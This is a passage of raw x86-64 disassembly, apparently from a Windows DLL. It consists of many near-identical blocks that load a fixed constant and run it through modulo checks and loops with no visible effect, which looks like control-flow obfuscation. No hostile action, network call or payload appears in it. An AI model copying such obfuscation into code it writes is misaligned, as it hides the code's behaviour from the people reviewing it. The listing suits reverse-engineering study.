   1800032f7:	41 03 cf             	add    %r15d,%ecx
   1800032fa:	41 8d 45 03          	lea    0x3(%r13),%eax
   1800032fe:	0f af c8             	imul   %eax,%ecx
   180003301:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180003307:	eb 3b                	jmp    0x180003344
   180003309:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   18000330f:	03 c3                	add    %ebx,%eax
   180003311:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180003317:	41 8b c0             	mov    %r8d,%eax
   18000331a:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180003320:	f7 e9                	imul   %ecx
   180003322:	d1 fa                	sar    $1,%edx
   180003324:	8b c2                	mov    %edx,%eax
   180003326:	c1 e8 1f             	shr    $0x1f,%eax
   180003329:	03 d0                	add    %eax,%edx
   18000332b:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   18000332e:	3b c8                	cmp    %eax,%ecx
   180003330:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003336:	74 04                	je     0x18000333c
   180003338:	2b c3                	sub    %ebx,%eax
   18000333a:	eb 02                	jmp    0x18000333e
   18000333c:	03 c3                	add    %ebx,%eax
   18000333e:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180003344:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000334a:	41 23 c2             	and    %r10d,%eax
   18000334d:	7d 07                	jge    0x180003356
   18000334f:	2b c3                	sub    %ebx,%eax
   180003351:	83 c8 fe             	or     $0xfffffffe,%eax
   180003354:	03 c3                	add    %ebx,%eax
   180003356:	85 c0                	test   %eax,%eax
   180003358:	74 af                	je     0x180003309
   18000335a:	eb 7b                	jmp    0x1800033d7
   18000335c:	41 8b c0             	mov    %r8d,%eax
   18000335f:	f7 e9                	imul   %ecx
   180003361:	d1 fa                	sar    $1,%edx
   180003363:	8b c2                	mov    %edx,%eax
   180003365:	c1 e8 1f             	shr    $0x1f,%eax
   180003368:	03 d0                	add    %eax,%edx
   18000336a:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   18000336d:	3b c8                	cmp    %eax,%ecx
   18000336f:	74 66                	je     0x1800033d7
   180003371:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003377:	41 8d 4d 17          	lea    0x17(%r13),%ecx
   18000337b:	83 c0 0b             	add    $0xb,%eax
   18000337e:	99                   	cltd
   18000337f:	f7 f9                	idiv   %ecx
   180003381:	eb 35                	jmp    0x1800033b8
   180003383:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180003389:	03 c3                	add    %ebx,%eax
   18000338b:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180003391:	41 8b c0             	mov    %r8d,%eax
   180003394:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   18000339a:	f7 e9                	imul   %ecx
   18000339c:	d1 fa                	sar    $1,%edx
   18000339e:	8b c2                	mov    %edx,%eax
   1800033a0:	c1 e8 1f             	shr    $0x1f,%eax
   1800033a3:	03 d0                	add    %eax,%edx
   1800033a5:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   1800033a8:	3b c8                	cmp    %eax,%ecx
   1800033aa:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800033b0:	74 04                	je     0x1800033b6
   1800033b2:	03 c3                	add    %ebx,%eax
   1800033b4:	eb 02                	jmp    0x1800033b8
   1800033b6:	2b c3                	sub    %ebx,%eax
   1800033b8:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800033be:	41 8b c1             	mov    %r9d,%eax
   1800033c1:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800033c7:	f7 e9                	imul   %ecx
   1800033c9:	8b c2                	mov    %edx,%eax
   1800033cb:	c1 e8 1f             	shr    $0x1f,%eax
   1800033ce:	03 d0                	add    %eax,%edx
   1800033d0:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   1800033d3:	3b c8                	cmp    %eax,%ecx
   1800033d5:	74 ac                	je     0x180003383
   1800033d7:	b8 e9 f4 2c 00       	mov    $0x2cf4e9,%eax
   1800033dc:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800033e2:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800033e8:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   1800033ee:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800033f4:	03 c8                	add    %eax,%ecx
   1800033f6:	41 8b c1             	mov    %r9d,%eax
   1800033f9:	f7 e9                	imul   %ecx
   1800033fb:	8b c2                	mov    %edx,%eax
   1800033fd:	c1 e8 1f             	shr    $0x1f,%eax
   180003400:	03 d0                	add    %eax,%edx
   180003402:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180003405:	3b c8                	cmp    %eax,%ecx
   180003407:	74 4a                	je     0x180003453
   180003409:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   18000340f:	41 03 cf             	add    %r15d,%ecx
   180003412:	41 03 cd             	add    %r13d,%ecx
   180003415:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   18000341b:	eb 1c                	jmp    0x180003439
   18000341d:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003423:	03 c3                	add    %ebx,%eax
   180003425:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   18000342b:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180003431:	03 c3                	add    %ebx,%eax
   180003433:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180003439:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000343f:	23 c6                	and    %esi,%eax
   180003441:	7d 07                	jge    0x18000344a
   180003443:	2b c3                	sub    %ebx,%eax
   180003445:	83 c8 fc             	or     $0xfffffffc,%eax
   180003448:	03 c3                	add    %ebx,%eax
   18000344a:	85 c0                	test   %eax,%eax
   18000344c:	74 cf                	je     0x18000341d
   18000344e:	e9 5b 01 00 00       	jmp    0x1800035ae
   180003453:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003459:	41 23 c2             	and    %r10d,%eax
   18000345c:	7d 07                	jge    0x180003465
   18000345e:	2b c3                	sub    %ebx,%eax
   180003460:	83 c8 fe             	or     $0xfffffffe,%eax
   180003463:	03 c3                	add    %ebx,%eax
   180003465:	85 c0                	test   %eax,%eax
   180003467:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000346d:	74 4a                	je     0x1800034b9
   18000346f:	41 8b cf             	mov    %r15d,%ecx
   180003472:	41 2b cd             	sub    %r13d,%ecx
   180003475:	03 c8                	add    %eax,%ecx
   180003477:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   18000347d:	eb 1c                	jmp    0x18000349b
   18000347f:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180003485:	03 c3                	add    %ebx,%eax
   180003487:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   18000348d:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003493:	03 c3                	add    %ebx,%eax
   180003495:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   18000349b:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800034a1:	41 8b c1             	mov    %r9d,%eax
   1800034a4:	f7 e9                	imul   %ecx
   1800034a6:	8b c2                	mov    %edx,%eax
   1800034a8:	c1 e8 1f             	shr    $0x1f,%eax
   1800034ab:	03 d0                	add    %eax,%edx
   1800034ad:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   1800034b0:	3b c8                	cmp    %eax,%ecx
   1800034b2:	74 cb                	je     0x18000347f
   1800034b4:	e9 f5 00 00 00       	jmp    0x1800035ae
   1800034b9:	23 c6                	and    %esi,%eax
   1800034bb:	7d 07                	jge    0x1800034c4
   1800034bd:	2b c3                	sub    %ebx,%eax
   1800034bf:	83 c8 fc             	or     $0xfffffffc,%eax
   1800034c2:	03 c3                	add    %ebx,%eax
   1800034c4:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800034ca:	85 c0                	test   %eax,%eax
   1800034cc:	74 65                	je     0x180003533
   1800034ce:	41 03 cf             	add    %r15d,%ecx
   1800034d1:	41 8d 45 03          	lea    0x3(%r13),%eax
   1800034d5:	0f af c8             	imul   %eax,%ecx
   1800034d8:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   1800034de:	eb 3b                	jmp    0x18000351b
   1800034e0:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   1800034e6:	03 c3                	add    %ebx,%eax
   1800034e8:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800034ee:	41 8b c0             	mov    %r8d,%eax
   1800034f1:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800034f7:	f7 e9                	imul   %ecx
   1800034f9:	d1 fa                	sar    $1,%edx
   1800034fb:	8b c2                	mov    %edx,%eax
   1800034fd:	c1 e8 1f             	shr    $0x1f,%eax
   180003500:	03 d0                	add    %eax,%edx
   180003502:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   180003505:	3b c8                	cmp    %eax,%ecx
   180003507:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000350d:	74 04                	je     0x180003513
   18000350f:	2b c3                	sub    %ebx,%eax
   180003511:	eb 02                	jmp    0x180003515
   180003513:	03 c3                	add    %ebx,%eax
   180003515:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   18000351b:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003521:	41 23 c2             	and    %r10d,%eax
   180003524:	7d 07                	jge    0x18000352d
   180003526:	2b c3                	sub    %ebx,%eax
   180003528:	83 c8 fe             	or     $0xfffffffe,%eax
   18000352b:	03 c3                	add    %ebx,%eax
   18000352d:	85 c0                	test   %eax,%eax
   18000352f:	74 af                	je     0x1800034e0
   180003531:	eb 7b                	jmp    0x1800035ae
   180003533:	41 8b c0             	mov    %r8d,%eax
   180003536:	f7 e9                	imul   %ecx
   180003538:	d1 fa                	sar    $1,%edx
   18000353a:	8b c2                	mov    %edx,%eax
   18000353c:	c1 e8 1f             	shr    $0x1f,%eax
   18000353f:	03 d0                	add    %eax,%edx
   180003541:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   180003544:	3b c8                	cmp    %eax,%ecx
   180003546:	74 66                	je     0x1800035ae
   180003548:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000354e:	41 8d 4d 17          	lea    0x17(%r13),%ecx
   180003552:	83 c0 0b             	add    $0xb,%eax
   180003555:	99                   	cltd
   180003556:	f7 f9                	idiv   %ecx
   180003558:	eb 35                	jmp    0x18000358f
   18000355a:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180003560:	03 c3                	add    %ebx,%eax
   180003562:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180003568:	41 8b c0             	mov    %r8d,%eax
   18000356b:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180003571:	f7 e9                	imul   %ecx
   180003573:	d1 fa                	sar    $1,%edx
   180003575:	8b c2                	mov    %edx,%eax
   180003577:	c1 e8 1f             	shr    $0x1f,%eax
   18000357a:	03 d0                	add    %eax,%edx
   18000357c:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   18000357f:	3b c8                	cmp    %eax,%ecx
   180003581:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003587:	74 04                	je     0x18000358d
   180003589:	03 c3                	add    %ebx,%eax
   18000358b:	eb 02                	jmp    0x18000358f
   18000358d:	2b c3                	sub    %ebx,%eax
   18000358f:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180003595:	41 8b c1             	mov    %r9d,%eax
   180003598:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   18000359e:	f7 e9                	imul   %ecx
   1800035a0:	8b c2                	mov    %edx,%eax
   1800035a2:	c1 e8 1f             	shr    $0x1f,%eax
   1800035a5:	03 d0                	add    %eax,%edx
   1800035a7:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   1800035aa:	3b c8                	cmp    %eax,%ecx
   1800035ac:	74 ac                	je     0x18000355a
   1800035ae:	b8 e9 f4 2c 00       	mov    $0x2cf4e9,%eax
   1800035b3:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800035b9:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800035bf:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   1800035c5:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800035cb:	03 c8                	add    %eax,%ecx
   1800035cd:	41 8b c1             	mov    %r9d,%eax
   1800035d0:	f7 e9                	imul   %ecx
   1800035d2:	8b c2                	mov    %edx,%eax
   1800035d4:	c1 e8 1f             	shr    $0x1f,%eax
   1800035d7:	03 d0                	add    %eax,%edx
   1800035d9:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   1800035dc:	3b c8                	cmp    %eax,%ecx
   1800035de:	74 4a                	je     0x18000362a
   1800035e0:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800035e6:	41 03 cf             	add    %r15d,%ecx
   1800035e9:	41 03 cd             	add    %r13d,%ecx
   1800035ec:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   1800035f2:	eb 1c                	jmp    0x180003610
   1800035f4:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800035fa:	03 c3                	add    %ebx,%eax
   1800035fc:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180003602:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180003608:	03 c3                	add    %ebx,%eax
   18000360a:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180003610:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003616:	23 c6                	and    %esi,%eax
   180003618:	7d 07                	jge    0x180003621
   18000361a:	2b c3                	sub    %ebx,%eax
   18000361c:	83 c8 fc             	or     $0xfffffffc,%eax
   18000361f:	03 c3                	add    %ebx,%eax
   180003621:	85 c0                	test   %eax,%eax
   180003623:	74 cf                	je     0x1800035f4
   180003625:	e9 5b 01 00 00       	jmp    0x180003785
   18000362a:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003630:	41 23 c2             	and    %r10d,%eax
   180003633:	7d 07                	jge    0x18000363c
   180003635:	2b c3                	sub    %ebx,%eax
   180003637:	83 c8 fe             	or     $0xfffffffe,%eax
   18000363a:	03 c3                	add    %ebx,%eax
   18000363c:	85 c0                	test   %eax,%eax
   18000363e:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003644:	74 4a                	je     0x180003690
   180003646:	41 8b cf             	mov    %r15d,%ecx
   180003649:	41 2b cd             	sub    %r13d,%ecx
   18000364c:	03 c8                	add    %eax,%ecx
   18000364e:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180003654:	eb 1c                	jmp    0x180003672
   180003656:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   18000365c:	03 c3                	add    %ebx,%eax
   18000365e:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180003664:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000366a:	03 c3                	add    %ebx,%eax
   18000366c:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180003672:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180003678:	41 8b c1             	mov    %r9d,%eax
   18000367b:	f7 e9                	imul   %ecx
   18000367d:	8b c2                	mov    %edx,%eax
   18000367f:	c1 e8 1f             	shr    $0x1f,%eax
   180003682:	03 d0                	add    %eax,%edx
   180003684:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180003687:	3b c8                	cmp    %eax,%ecx
   180003689:	74 cb                	je     0x180003656
   18000368b:	e9 f5 00 00 00       	jmp    0x180003785
   180003690:	23 c6                	and    %esi,%eax
   180003692:	7d 07                	jge    0x18000369b
   180003694:	2b c3                	sub    %ebx,%eax
   180003696:	83 c8 fc             	or     $0xfffffffc,%eax
   180003699:	03 c3                	add    %ebx,%eax
   18000369b:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800036a1:	85 c0                	test   %eax,%eax
   1800036a3:	74 65                	je     0x18000370a
   1800036a5:	41 03 cf             	add    %r15d,%ecx
   1800036a8:	41 8d 45 03          	lea    0x3(%r13),%eax
   1800036ac:	0f af c8             	imul   %eax,%ecx
   1800036af:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   1800036b5:	eb 3b                	jmp    0x1800036f2
   1800036b7:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   1800036bd:	03 c3                	add    %ebx,%eax
   1800036bf:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800036c5:	41 8b c0             	mov    %r8d,%eax
   1800036c8:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800036ce:	f7 e9                	imul   %ecx
   1800036d0:	d1 fa                	sar    $1,%edx
   1800036d2:	8b c2                	mov    %edx,%eax
   1800036d4:	c1 e8 1f             	shr    $0x1f,%eax
   1800036d7:	03 d0                	add    %eax,%edx
   1800036d9:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   1800036dc:	3b c8                	cmp    %eax,%ecx
   1800036de:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800036e4:	74 04                	je     0x1800036ea
   1800036e6:	2b c3                	sub    %ebx,%eax
   1800036e8:	eb 02                	jmp    0x1800036ec
   1800036ea:	03 c3                	add    %ebx,%eax
   1800036ec:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800036f2:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800036f8:	41 23 c2             	and    %r10d,%eax
   1800036fb:	7d 07                	jge    0x180003704
   1800036fd:	2b c3                	sub    %ebx,%eax
   1800036ff:	83 c8 fe             	or     $0xfffffffe,%eax
   180003702:	03 c3                	add    %ebx,%eax
   180003704:	85 c0                	test   %eax,%eax
   180003706:	74 af                	je     0x1800036b7
   180003708:	eb 7b                	jmp    0x180003785
   18000370a:	41 8b c0             	mov    %r8d,%eax
   18000370d:	f7 e9                	imul   %ecx
   18000370f:	d1 fa                	sar    $1,%edx
   180003711:	8b c2                	mov    %edx,%eax
   180003713:	c1 e8 1f             	shr    $0x1f,%eax
   180003716:	03 d0                	add    %eax,%edx
   180003718:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   18000371b:	3b c8                	cmp    %eax,%ecx
   18000371d:	74 66                	je     0x180003785
   18000371f:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003725:	41 8d 4d 17          	lea    0x17(%r13),%ecx
   180003729:	83 c0 0b             	add    $0xb,%eax
   18000372c:	99                   	cltd
   18000372d:	f7 f9                	idiv   %ecx
   18000372f:	eb 35                	jmp    0x180003766
   180003731:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180003737:	03 c3                	add    %ebx,%eax
   180003739:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   18000373f:	41 8b c0             	mov    %r8d,%eax
   180003742:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180003748:	f7 e9                	imul   %ecx
   18000374a:	d1 fa                	sar    $1,%edx
   18000374c:	8b c2                	mov    %edx,%eax
   18000374e:	c1 e8 1f             	shr    $0x1f,%eax
   180003751:	03 d0                	add    %eax,%edx
   180003753:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   180003756:	3b c8                	cmp    %eax,%ecx
   180003758:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000375e:	74 04                	je     0x180003764
   180003760:	03 c3                	add    %ebx,%eax
   180003762:	eb 02                	jmp    0x180003766
   180003764:	2b c3                	sub    %ebx,%eax
   180003766:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   18000376c:	41 8b c1             	mov    %r9d,%eax
   18000376f:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180003775:	f7 e9                	imul   %ecx
   180003777:	8b c2                	mov    %edx,%eax
   180003779:	c1 e8 1f             	shr    $0x1f,%eax
   18000377c:	03 d0                	add    %eax,%edx
   18000377e:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180003781:	3b c8                	cmp    %eax,%ecx
   180003783:	74 ac                	je     0x180003731
   180003785:	b8 e9 f4 2c 00       	mov    $0x2cf4e9,%eax
   18000378a:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180003790:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180003796:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   18000379c:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800037a2:	03 c8                	add    %eax,%ecx
   1800037a4:	41 8b c1             	mov    %r9d,%eax
   1800037a7:	f7 e9                	imul   %ecx
   1800037a9:	8b c2                	mov    %edx,%eax
   1800037ab:	c1 e8 1f             	shr    $0x1f,%eax
   1800037ae:	03 d0                	add    %eax,%edx
   1800037b0:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   1800037b3:	3b c8                	cmp    %eax,%ecx
   1800037b5:	74 4a                	je     0x180003801
   1800037b7:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800037bd:	41 03 cf             	add    %r15d,%ecx
   1800037c0:	41 03 cd             	add    %r13d,%ecx
   1800037c3:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   1800037c9:	eb 1c                	jmp    0x1800037e7
   1800037cb:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800037d1:	03 c3                	add    %ebx,%eax
   1800037d3:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800037d9:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   1800037df:	03 c3                	add    %ebx,%eax
   1800037e1:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800037e7:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800037ed:	23 c6                	and    %esi,%eax
   1800037ef:	7d 07                	jge    0x1800037f8
   1800037f1:	2b c3                	sub    %ebx,%eax
   1800037f3:	83 c8 fc             	or     $0xfffffffc,%eax
   1800037f6:	03 c3                	add    %ebx,%eax
   1800037f8:	85 c0                	test   %eax,%eax
   1800037fa:	74 cf                	je     0x1800037cb
   1800037fc:	e9 5b 01 00 00       	jmp    0x18000395c
   180003801:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003807:	41 23 c2             	and    %r10d,%eax
   18000380a:	7d 07                	jge    0x180003813
   18000380c:	2b c3                	sub    %ebx,%eax
   18000380e:	83 c8 fe             	or     $0xfffffffe,%eax
   180003811:	03 c3                	add    %ebx,%eax
   180003813:	85 c0                	test   %eax,%eax
   180003815:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   18000381b:	74 4a                	je     0x180003867
   18000381d:	41 8b cf             	mov    %r15d,%ecx
   180003820:	41 2b cd             	sub    %r13d,%ecx
   180003823:	03 c8                	add    %eax,%ecx
   180003825:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   18000382b:	eb 1c                	jmp    0x180003849
   18000382d:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180003833:	03 c3                	add    %ebx,%eax
   180003835:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   18000383b:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003841:	03 c3                	add    %ebx,%eax
   180003843:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180003849:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   18000384f:	41 8b c1             	mov    %r9d,%eax
   180003852:	f7 e9                	imul   %ecx
   180003854:	8b c2                	mov    %edx,%eax
   180003856:	c1 e8 1f             	shr    $0x1f,%eax
   180003859:	03 d0                	add    %eax,%edx
   18000385b:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   18000385e:	3b c8                	cmp    %eax,%ecx
   180003860:	74 cb                	je     0x18000382d
   180003862:	e9 f5 00 00 00       	jmp    0x18000395c
   180003867:	23 c6                	and    %esi,%eax
   180003869:	7d 07                	jge    0x180003872
   18000386b:	2b c3                	sub    %ebx,%eax
   18000386d:	83 c8 fc             	or     $0xfffffffc,%eax
   180003870:	03 c3                	add    %ebx,%eax
   180003872:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180003878:	85 c0                	test   %eax,%eax
   18000387a:	74 65                	je     0x1800038e1
   18000387c:	41 03 cf             	add    %r15d,%ecx
   18000387f:	41 8d 45 03          	lea    0x3(%r13),%eax
   180003883:	0f af c8             	imul   %eax,%ecx
   180003886:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   18000388c:	eb 3b                	jmp    0x1800038c9
   18000388e:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180003894:	03 c3                	add    %ebx,%eax
   180003896:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   18000389c:	41 8b c0             	mov    %r8d,%eax
   18000389f:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800038a5:	f7 e9                	imul   %ecx
   1800038a7:	d1 fa                	sar    $1,%edx
   1800038a9:	8b c2                	mov    %edx,%eax
   1800038ab:	c1 e8 1f             	shr    $0x1f,%eax
   1800038ae:	03 d0                	add    %eax,%edx
   1800038b0:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   1800038b3:	3b c8                	cmp    %eax,%ecx
   1800038b5:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800038bb:	74 04                	je     0x1800038c1
   1800038bd:	2b c3                	sub    %ebx,%eax
   1800038bf:	eb 02                	jmp    0x1800038c3
   1800038c1:	03 c3                	add    %ebx,%eax
   1800038c3:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800038c9:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800038cf:	41 23 c2             	and    %r10d,%eax
   1800038d2:	7d 07                	jge    0x1800038db
   1800038d4:	2b c3                	sub    %ebx,%eax
   1800038d6:	83 c8 fe             	or     $0xfffffffe,%eax
   1800038d9:	03 c3                	add    %ebx,%eax
   1800038db:	85 c0                	test   %eax,%eax
   1800038dd:	74 af                	je     0x18000388e
   1800038df:	eb 7b                	jmp    0x18000395c
   1800038e1:	41 8b c0             	mov    %r8d,%eax
   1800038e4:	f7 e9                	imul   %ecx
   1800038e6:	d1 fa                	sar    $1,%edx
   1800038e8:	8b c2                	mov    %edx,%eax
   1800038ea:	c1 e8 1f             	shr    $0x1f,%eax
   1800038ed:	03 d0                	add    %eax,%edx
   1800038ef:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   1800038f2:	3b c8                	cmp    %eax,%ecx
   1800038f4:	74 66                	je     0x18000395c
   1800038f6:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800038fc:	41 8d 4d 17          	lea    0x17(%r13),%ecx
   180003900:	83 c0 0b             	add    $0xb,%eax
   180003903:	99                   	cltd
   180003904:	f7 f9                	idiv   %ecx
   180003906:	eb 35                	jmp    0x18000393d
   180003908:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   18000390e:	03 c3                	add    %ebx,%eax
   180003910:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180003916:	41 8b c0             	mov    %r8d,%eax
   180003919:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   18000391f:	f7 e9                	imul   %ecx
   180003921:	d1 fa                	sar    $1,%edx
   180003923:	8b c2                	mov    %edx,%eax
   180003925:	c1 e8 1f             	shr    $0x1f,%eax
   180003928:	03 d0                	add    %eax,%edx
   18000392a:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   18000392d:	3b c8                	cmp    %eax,%ecx
   18000392f:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003935:	74 04                	je     0x18000393b
   180003937:	03 c3                	add    %ebx,%eax
   180003939:	eb 02                	jmp    0x18000393d
   18000393b:	2b c3                	sub    %ebx,%eax
   18000393d:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180003943:	41 8b c1             	mov    %r9d,%eax
   180003946:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   18000394c:	f7 e9                	imul   %ecx
   18000394e:	8b c2                	mov    %edx,%eax
   180003950:	c1 e8 1f             	shr    $0x1f,%eax
   180003953:	03 d0                	add    %eax,%edx
   180003955:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180003958:	3b c8                	cmp    %eax,%ecx
   18000395a:	74 ac                	je     0x180003908
   18000395c:	41 8d 44 24 ff       	lea    -0x1(%r12),%eax
   180003961:	89 44 24 20          	mov    %eax,0x20(%rsp)
   180003965:	b8 e9 f4 2c 00       	mov    $0x2cf4e9,%eax
   18000396a:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180003970:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180003976:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   18000397c:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180003982:	03 c8                	add    %eax,%ecx
   180003984:	41 8b c1             	mov    %r9d,%eax
   180003987:	f7 e9                	imul   %ecx
   180003989:	8b c2                	mov    %edx,%eax
   18000398b:	c1 e8 1f             	shr    $0x1f,%eax
   18000398e:	03 d0                	add    %eax,%edx
   180003990:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180003993:	3b c8                	cmp    %eax,%ecx
   180003995:	74 4a                	je     0x1800039e1
   180003997:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
